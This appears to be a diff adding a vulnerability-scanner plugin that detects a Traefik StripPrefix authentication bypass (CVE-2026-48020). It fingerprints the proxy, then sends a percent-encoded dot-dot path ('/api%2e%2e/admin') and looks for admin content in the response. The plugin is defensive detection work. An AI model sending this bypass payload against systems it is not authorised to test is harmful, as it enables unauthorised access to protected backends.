@@ -1,0 +1,102 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Traefik_CVE_2026_48020"
+  author: "dyeddala"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-48020"
+  }
+  severity: CRITICAL
+  title: "Traefik < 2.11.48, 3.6.19, 3.7.3 - StripPrefix Authentication Bypass (CVE-2026-48020)"
+  description: "Traefik HTTP reverse proxy and load balancer prior to versions 2.11.48, 3.6.19, and 3.7.3 contains a vulnerability in the StripPrefix middleware. An unauthenticated attacker can leverage path normalization issues using double dots (..) or percent-encoded forms (%2e%2e) to bypass route-level authentication and authorization controls, allowing access to protected backend paths."
+  recommendation: "Upgrade Traefik to version 2.11.48, 3.6.19, 3.7.3, or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-48020"
+  }
+}
+
+config: {
+  debug: false
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_traefik"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 404
+      expect_any: {
+        conditions: [
+          {
+            body: {}
+            contains: "404 page not found"
+          },
+          {
+            body: {}
+            contains: "404"
+          },
+          {
+            header: {
+              name: "Content-Type"
+            }
+            contains: "text/"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "test_auth_bypass_encoded"
+  http_request: {
+    method: GET
+    uri: "/api%2e%2e/admin"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          {
+            body: {}
+            contains: "Reached endpoint successfully"
+          },
+          {
+            body: {}
+            contains: "ADMIN_SECRET_REACHED"
+          },
+          {
+            body: {}
+            contains: "admin"
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+workflows: {
+  actions: [
+    "fingerprint_traefik",
+    "test_auth_bypass_encoded"
+  ]
+}
